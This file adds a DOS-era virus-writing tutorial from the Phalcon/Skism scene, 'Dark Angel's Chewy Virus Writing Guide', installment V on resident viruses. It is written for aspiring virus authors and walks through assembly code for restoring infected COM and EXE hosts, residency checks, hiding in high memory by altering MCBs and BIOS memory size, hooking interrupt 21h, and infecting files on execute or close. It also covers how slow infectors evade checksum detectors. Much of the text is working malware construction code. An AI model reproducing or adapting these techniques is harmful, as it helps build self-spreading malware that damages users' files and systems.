@@ -1,0 +1,441 @@
+      //==//  //  //  /||      //      //====  //==//  //|   //
+     //  //  //  //  //||     //      //      //  //  //||  //
+    //==//  //==//  //=||    //      //      //  //  // || //
+   //      //  //  //  ||   //      //      //  //  //  ||//
+  //      //  //  //   ||  //====  //====  //==//  //   ||/
+  
+     /====   // //     //  /====   /|   /|
+    //      // //     //  //      //|  //|
+    ===\   // //     //   ===\   //|| //||
+      //  //  \\    //      //  // ||// ||
+  ====/  //    \\  //   ====/  //  ||/  ||
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  DISCLAIMER: Why do I bother writing one??
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  MO STUFF: Greets to all the Phalcon/Skism
+    crew,especially Garbageheap,Hellraiser,
+    Demogorgon,Lazarus Long,and Decimator.
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  
+  Dark Angel's Chewy Virus Writing Guide
+  ÄÄÄÄ ÄÄÄÄÄÄÄ ÄÄÄÄÄ ÄÄÄÄÄ ÄÄÄÄÄÄÄ ÄÄÄÄÄ
+    "Over 2 billion served"
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  INSTALLMENT V: RESIDENT VIRUSES, PART II
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  
+  After reading  the the  Clumpy Guide, you should have at least some idea of
+  how to  code a  resident virus.  However, the somewhat vague descriptions I
+  gave may  have left  you in a befuddled state.  Hopefully, this installment
+  will clear the air.
+  
+  ÄÄÄÄÄÄÄÄÄ
+  STRUCTURE
+  ÄÄÄÄÄÄÄÄÄ
+  In case  you missed  it the last time, here is a quick, general overview of
+  the structure  of the  resident virus.   The  virus consists  of two  major
+  portions, the  loading stub  and the  interrupt handlers.  The loading stub
+  performs two  functions.  First, it redirects interrupts to the virus code.
+  Second, it causes the virus to go resident.  The interrupt handlers contain
+  the code  which  cause  file  infection.    Generally,  the  handlers  trap
+  interrupt 21h and intercept such calls as file execution.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄ
+  LOADING STUB
+  ÄÄÄÄÄÄÄÄÄÄÄÄ
+  The loading  stub consists of two major portions, the residency routine and
+  the restoration  routine.   The latter portion, which handles the return of
+  control to  the original  file, is  identical as the one in the nonresident
+  virus.  I will briefly touch upon it here.
+  
+  By now  you  should  understand  thoroughly  the  theory  behind  COM  file
+  infection.   By simply  replacing the  first few  bytes,  transfer  can  be
+  controlled to  the virus.   The  trick in  restoring COM files is simply to
+  restore the  overwritten  bytes  at  the  beginning  of  the  file.    This
+  restoration takes place only in memory and is therefore far from permanent.
+  Since COM files always load in a single memory segment and begin loading at
+  offset 100h  in the  memory  segment  (to  make  room  for  the  PSP),  the
+  restoration procedure  is very  simple.   For example,  if the  first three
+  bytes of  a COM  file were  stored in a buffer called "first3" before being
+  overwritten by the virus, then the following code would restore the code in
+  memory:
+  
+    mov  di,100h          ; Absolute location of destination
+    lea  si,[bp+first3]   ; Load address of saved bytes.
+                          ; Assume bp = "delta offset"
+    movsw                 ; Assume CS = DS = ES and a cleared direction flag
+    movsb                 ; Move three bytes
+  
+  The problem of returning control to the program still remains.  This simply
+  consists of  forcing the  program to  transfer control to offset 100h.  The
+  easiest routine follows:
+  
+    mov  di,100h
+    jmp  di
+  
+  There are  numerous variations of this routine, but they all accomplish the
+  basic task of setting the ip to 100h.
+  
+  You should  also understand  the concept  behind EXE infection by now.  EXE
+  infection, at  its most  basic level, consists of changing certain bytes in
+  the EXE  header.   The trick  is simply  to undo  all the changes which the
+  virus made.  The code follows:
+  
+    mov     ax, es                          ; ES = segment of PSP
+    add     ax, 10h                         ; Loading starts after PSP
+    add     word ptr cs:[bp+OrigCSIP+2], ax ; Header segment value was
+                                            ; relative to end of PSP
+    cli
+    add     ax, word ptr cs:[bp+OrigSSSP+2] ; Adjust the stack as well
+    mov     ss, ax
+    mov     sp, word ptr cs:[bp+OrigSSSP]
+    sti
+    db      0eah                            ; JMP FAR PTR SEG:OFF
+  OrigCSIP  dd ?                            ; Put values from the header
+  OrigSSSP  dd ?                            ; into here
+  
+  If the  virus is  an EXE-specific  infector but you still wish to use a COM
+  file as  the carrier file, then simply set the OrigCSIP value to FFF0:0000.
+  This will  be changed  by the  restoration routine  to PSP:0000  which  is,
+  conveniently, an int 20h instruction.
+  
+  All that  stuff should  not be  new.   Now we shall tread on new territory.
+  There are  two methods  of residency.  The first is the weenie method which
+  simply consists of using DOS interrupts to do the job for you.  This method
+  sucks because  it is  1) easily  trappable by  even the  most primitive  of
+  resident virus  monitors and  2) forces the program to terminate execution,
+  thereby alerting  the user  to the  presence of the virus.  I will not even
+  present code  for the  weenie method  because, as  the name suggests, it is
+  only for  weenies.   Real programmers  write their  own residency routines.
+  This basically consists of MCB-manipulation.  The general method is:
+  
+  1.   Check for prior installation.  If already installed, exit the virus.
+  2.   Find the top of memory.
+  3.   Allocate the high memory.
+  4.   Copy the virus to high memory.
+  5.   Swap the interrupt vectors.
+  
+  There are  several variations  on this technique and they will be discussed
+  as the need arises.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  INSTALLATION CHECK
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  There are  several different  types of installation check.  The most common
+  is a  call to int 21h with AX set to a certain value.  If certain registers
+  are returned  set to  certain values,  then the  virus is  resident.    For
+  example, a sample residency check would be:
+  
+    mov  ax,9999h  ; residency check
+    int  21h
+    cmp  bx,9999h  ; returns bx=9999h if installed
+    jz   already_installed
+  
+  When choosing  a value  for ax in the installation check, make sure it does
+  not conflict  with an  existing function  unless the  function is harmless.
+  For example,  do not  use display  string (ah=9)  unless you  wish to  have
+  unpredictable results  when the virus is first being installed.  An example
+  of a harmless function is get DOS version (ah=30h) or flush keyboard buffer
+  (ah=0bh).   Of course, if the check conflicts with a current function, make
+  sure it  is narrow  enough so no programs will have a problem with it.  For
+  example, do  not merely trap ah=30h, but trap ax=3030h or even ax=3030h and
+  bx=3030h.
+  
+  Another  method  of  checking  for  residency  is  to  search  for  certain
+  characteristics of  the virus.   For  example, if  the virus always sets an
+  unused interrupt  vector to  point to  its code, a possible residency check
+  would be to search the vector for the virus characteristics.  For example:
+  
+    xor  ax,ax
+    mov  ds,ax     ; ds->interrupt table
+    les  bx,ds:[60h*4] ; get address of interrupt 60h
+                   ; assume the virus traps this and puts its int 21h handler
+                   ; here
+    cmp  es:bx,0FF2Eh ; search for the virus string
+     .
+     .
+     .
+  int60:
+    jmp far ptr cs:origint21
+  
+  When using this method, take care to ensure that there is no possibility of
+  this characteristic  being false when the virus is resident.  In this case,
+  another program must not trap the int 60h vector or else the check may fail
+  even if  the virus  is  already  resident,  thereby  causing  unpredictable
+  results.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  FIND THE TOP OF MEMORY
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  DOS generally  loads all available memory to a program upon loading.  Armed
+  with this  knowledge, the  virus can  easily determine the available memory
+  size.  Once again, the MCB structure is:
+  
+  Offset    Size Meaning
+  ------ ------- -------
+  0         BYTE 'M' or 'Z'
+  1         WORD Process ID (PSP of block's owner)
+  3         WORD Size in paragraphs
+  5      3 BYTES Reserved (Unused)
+  8      8 BYTES DOS 4+ uses this.  Yay.
+  
+    mov  ax,ds     ; Assume DS initially equals the segment of the PSP
+    dec  ax
+    mov  ds,ax     ; DS = MCB of infected program
+    mov  bx,ds:[3] ; Get MCB size (total available paragraphs to program)
+  
+  A simpler  method of  performing the same action is to use DOS's reallocate
+  memory function in the following manner:
+  
+    mov  ah,4ah    ; Alter memory allocation (assume ES = PSP)
+    mov  bx,0FFFFh ; Request a ridiculous amount of memory
+    int  21h       ; Returns maximum available memory in BX
+                   ; This is the same value as in ds:[3]
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  ALLOCATE THE HIGH MEMORY
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  The easiest method to allocate memory is to let DOS do the work for you.
+  
+    mov  ah,4ah    ; Alter memory allocation (assume ES = PSP)
+    sub  bx,(endvirus-startvirus+15)/16+1 ; Assume BX originally held total
+                   ; memory available to the program (returned by earlier
+                   ; call to int 21h/function 4ah
+    int  21h
+  
+    mov  ah,48h    ; Allocate memory
+    mov  bx,(endvirus-startvirus+15)/16
+    int  21h
+    mov  es,ax     ; es now holds the high memory segment
+  
+    dec  bx
+    mov  byte ptr ds:[0], 'Z' ; probably not needed
+    mov  word ptr ds:[1], 8   ; Mark DOS as owner of MCB
+  
+  The purpose  of marking  DOS as  the owner  of the  MCB is  to prevent  the
+  deallocation of the memory area upon termination of the carrier program.
+  
+  Of course, some may prefer direct manipulation of the MCBs.  This is easily
+  accomplished.   If ds is equal to the segment of the carrier program's MCB,
+  then the following code will do the trick:
+  
+    ; Step 1) Shrink the carrier program's memory allocation
+    ; One paragraph is added for the MCB of the memory area which the virus
+    ; will inhabit
+    sub  ds:[3],(endvirus-startvirus+15)/16 + 1
+  
+    ; Step 2) Mark the carrier program's MCB as the last in the chain
+    ; This isn't really necessary, but it assures that the virus will not
+    ; corrupt the memory chains
+    mov  byte ptr ds:[0],'Z'
+  
+    ; Step 3) Alter the program's top of memory field in the PSP
+    ; This preserves compatibility with COMMAND.COM and any other program
+    ; which uses the field to determine the top of memory
+    sub  word ptr ds:[12h],(endvirus-startvirus+15)/16 + 1
+  
+    ; Step 4) Calculate the first usable segment
+    mov  bx,ds:[3] ; Get MCB size
+    stc            ; Add one for the MCB segment
+    adc  bx,ax     ; Assume AX still equals the MCB of the carrier file
+                   ; BX now holds first usable segment.  Build the MCB
+                   ; there
+    ; Alternatively, you can use the value in ds:[12h] as the first usable
+    ; segment:
+    ; mov  bx,ds:[12h]
+  
+    ; Step 5) Build the MCB
+    mov  ds,bx     ; ds holds the area to build the MCB
+    inc  bx        ; es now holds the segment of the memory area controlled
+    mov  es,bx     ; by the MCB
+    mov  byte ptr ds:[0],'Z' ; Mark the MCB as the last in the chain
+                   ; Note: you can have more than one MCB chain
+    mov  word ptr ds:[1],8   ; Mark DOS as the owner
+    mov  word ptr ds:[3],(endvirus-startvirus+15)/16 ; FIll in size field
+  
+  There is yet another method involving direct manipulation.
+  
+    ; Step 1) Shrink the carrier program's memory allocation
+    ; Note that rounding is to the nearest 1024 bytes and there is no
+    ; addition for an MCB
+    sub  ds:[3],((endvirus-startvirus+1023)/1024)*64
+  
+    ; Step 2) Mark the carrier program's MCB as the last in the chain
+    mov  byte ptr ds:[1],'Z'
+  
+    ; Step 3) Alter the program's top of memory field in the PSP
+    sub  word ptr ds:[12h],((endvirus-startvirus+1023)/1024)*64
+  
+    ; Step 4) Calculate the first usable segment
+    mov  es,word ptr ds:[12h]
+  
+    ; Step 5) Shrink the total memory as held in BIOS
+    ; Memory location 0:413h holds the total system memory in K
+    xor  ax,ax
+    mov  ds,ax
+    sub  ds:[413h],(endvirus-startvirus+1023)/1024 ; shrink memory size
+  
+  This method  is great  because it  is simple and short.  No MCB needs to be
+  created because  DOS will no longer allocate memory held by the virus.  The
+  modification of the field in the BIOS memory area guarantees this.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  COPY THE VIRUS TO HIGH MEMORY
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  This is  ridiculously easy  to do.  If ES holds the high memory segment, DS
+  holds CS, and BP holds the delta offset, then the following code will do:
+  
+    lea  si,[bp+offset startvirus]
+    xor  di,di     ; destination @ 0
+    mov  cx,(endvirus-startvirus)/2
+    rep  movsw     ; Copy away, use words for speed
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  SWAP INTERRUPT VECTORS
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  There are,  once again,  two ways  to do this; via DOS or directly.  Almost
+  every programmer  worth his  salt has  played with interrupt vectors at one
+  time or another.  Via DOS:
+  
+    push es        ; es->high memory
+    pop  ds        ; ds->high memory
+    mov  ax,3521h  ; get old int 21h handler
+    int  21h       ; to es:bx
+    mov  word ptr ds:oldint21,bx  ; save it
+    mov  word ptr ds:oldint21+2,es
+    mov  dx,offset int21 ; ds:dx->new int 21h handler in virus
+    mov  ax,2521h  ; set handler
+    int  21h
+  
+  And direct manipulation:
+    xor  ax,ax
+    mov  ds,ax
+    lds  bx,ds:[21h*4]
+    mov  word ptr es:oldint21,bx
+    mov  word ptr es:oldint21+2,ds
+    mov  ds,ax
+    mov  ds:[21h*4],offset int21
+    mov  ds:[21h*4+2],es
+  
+  Delta offset  calculations  are  not  needed  since  the  location  of  the
+  variables is  known.   This is because the virus is always loaded into high
+  memory starting in offset 0.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  INTERRUPT HANDLER
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  The interrupt  handler intercepts  function calls  to DOS and waylays them.
+  The interrupt  handler typically  begins with  a check  for a  call to  the
+  installation check.  For example:
+  
+  int21:
+    cmp  ax,9999h  ; installation check?
+    jnz  not_installation_check
+    xchg ax,bx     ; return bx = 9999h if installed
+    iret           ; exit interrupt handler
+  not_installation_check:
+  ; rest of interrupt handler goes here
+  
+  With this  out of  the way,  the virus  can trap whichever DOS functions it
+  wishes.    Generally  the  most  effective  function  to  trap  is  execute
+  (ax=4b00h), as  the most commonly executed files will be infected.  Another
+  function to  trap, albeit  requiring more work, is handle close.  This will
+  infect  on   copies,  viewings,  patchings,  etc.    With  some  functions,
+  prechaining is  desired; others,  postchaining.   Use common sense.  If the
+  function destroys  the filename  pointer, then  use prechaining.    If  the
+  function   needs   to  be   completed  before  infection  can  take  place,
+  postchaining should be used.  Prechaining is simple:
+  
+    pushf           ; simulate an int 21h call
+    call dword ptr cs:oldint21
+  
+  ; The following code ensures that the flags will be properly set upon
+  ; return to the caller
+    pushf
+    push bp
+    push ax
+  
+  ; flags         [bp+10]
+  ; calling CS:IP [bp+6]
+  ; flags new     [bp+4]
+  ; bp            [bp+2]
+  ; ax            [bp]
+  
+    mov  bp, sp     ; setup stack frame
+    mov  ax, [bp+4] ; get new flags
+    mov  [bp+10], ax; replace the old with the new
+  
+    pop  ax         ; restore stack
+    pop  bp
+    popf
+  
+  To exit  the interrupt  handler after  prechaining, use  an iret  statement
+  rather than a retn or retf.  Postchaining is even simpler:
+  
+    jmp  dword ptr cs:oldint21 ; this never returns to the virus int handler
+  
+  When leaving  the interrupt  handler, make  sure  that  the  stack  is  not
+  unbalanced and  that the  registers were  not altered.   Save the registers
+  right after prechaining and long before postchaining.
+  
+  Infection in  a resident  virus is  essentially  the  same  as  that  in  a
+  nonresident virus.   The  only difference occurs when the interrupt handler
+  traps one  of the functions used in the infection routine.  For example, if
+  handle close is trapped, then the infection routine must replace the handle
+  close int 21h call with a call to the original interrupt 21h handler, a la:
+  
+    pushf
+    call dword ptr cs:oldint21
+  
+  It is also necessary to handle encryption in another manner with a resident
+  virus.  In the nonresident virus, it was not necessary to preserve the code
+  at all  times.   However, it  is desirable to keep the interrupt handler(s)
+  decrypted, even  when infecting.   Therefore,  the virus  should  keep  two
+  copies of  itself in  memory, one  as code  and one as data.  The encryptor
+  should encrypt  the secondary  copy  of  the  virus,  thereby  leaving  the
+  interrupt handler(s)  alone.   This is  especially important  if the  virus
+  traps other interrupts such as int 9h or int 13h.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  A THEORY ON RESIDENT VIRUSES
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  Resident viruses  can typically  be divided  into two  categories; slow and
+  fast infectors.  They each have their own advantages and disadvantages.
+  
+  Slow infectors  do not  infect except in the case of a file creation.  This
+  infector traps file creates and infects upon the closing of the file.  This
+  type of  virus infects  on new  file creations  and copying  of files.  The
+  disadvantage is  that the  virus spreads slowly.  This disadvantage is also
+  an advantage,  as this  may keep  it undetected  for a long time.  Although
+  slow infectors sound ineffective, in reality they can work well.  Infection
+  on file  creations means that checksum/CRC virus detectors won't be able to
+  checksum/CRC the  file until  after it  has been  infected.   Additionally,
+  files are  often copied  from one  directory to  another after testing.  So
+  this method can work.
+  
+  Fast infectors  infect on  executes.   This type  of virus will immediately
+  attack commonly  used files,  ensuring the continual residency of the virus
+  in subsequent  boots.   This is  the primary  advantage, but it is also the
+  primary disadvantage.   The  infector works  so rapidly  that the  user may
+  quickly detect  a discrepancy with the system, especially if the virus does
+  not utilise any stealth techniques.
+  
+  Of course,  there is  no  "better"  way.    It  is  a  matter  of  personal
+  preference.   The vast  majority  of  viruses  today  are  fast  infectors,
+  although slow infectors are beginning to appear with greater frequency.
+  
+  If the  virus is  to infect  on a  create or  open, it  first must copy the
+  filename to  a buffer,  execute the  call, and  save the handle.  The virus
+  must then  wait for  a handle close corresponding to that handle and infect
+  using the  filename stored  in the  buffer.  This is the simplest method of
+  infecting after a handle close without delving into DOS internals.
+  
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  IF YOU DON'T UNDERSTAND IT YET
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  don't despair;  it will  come after  some time and much practise.  You will
+  soon find  that resident  viruses  are  easier  to  code  than  nonresident
+  viruses.   That's all  for this  installment, but  be sure to grab the next
+  one.
